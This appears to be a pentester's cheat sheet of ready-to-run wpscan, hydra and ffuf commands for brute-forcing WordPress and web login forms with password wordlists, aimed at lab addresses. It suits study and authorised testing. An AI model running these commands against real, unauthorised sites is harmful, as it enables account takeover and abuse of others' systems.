# Web & CMS Brute Force

##### WPScan brute force - uses XMLRPC
This uses the purpose built `wpscan` tool to brute force a Wordpress installation. This is by far the most reliable way to do it. 

```
wpscan --url http://ADDRESS/WP_LOCATION --usernames admin --passwords /usr/share/wordlists/rockyou.txt 1 тип
```


##### Wordpress Brute Force,  using Hydra
An alternative to `wpscane`, using `hydra`.

```
$ hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt IP_ADDRESS http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username"

```


##### Hydra Brute Force
This is used for when brute-forcing a login page. The key part is making sure that `<RequestBody>` and `<IncorrectVerbiage` are correct. Below are some examples.

*Syntax*
```
$ sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
```

![[Hydra Options.png]]

*Example Usage*
```
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
```

```
sudo hydra -l mike -P /usr/share/wordlists/rockyou.txt 10.10.123.142 -s 8888 http-post-form "/login:user=^USER^&password=^PASS^:F=Invalid username or password" -V -t 64 -I -f
```

-f = Stop on Success
-I = Ignore previous attempts 
-t = THREADS
-d = Debug mode 

Example with no knowledge of Success Form
```
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt dc-4 http-post-form '/login.php:username=^USER^&password=^PASS^:S=command'
```

Original Form 
![](https://infiniteloginscom.files.wordpress.com/2020/02/image-39.png?w=700) 

Invalid State
![](https://infiniteloginscom.files.wordpress.com/2020/02/image-44.png?w=700)

**ffuf**

Produce the valid_usernames.txt from [Valid Usernames](obsidian://open?vault=Security%20%26%20PenTesting&file=Enumeration%2FWeb%2FValid%20Usernames)[]

```
ffuf -w valid_usernames.txt:W1,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.116.225/customers/login -fc 200
```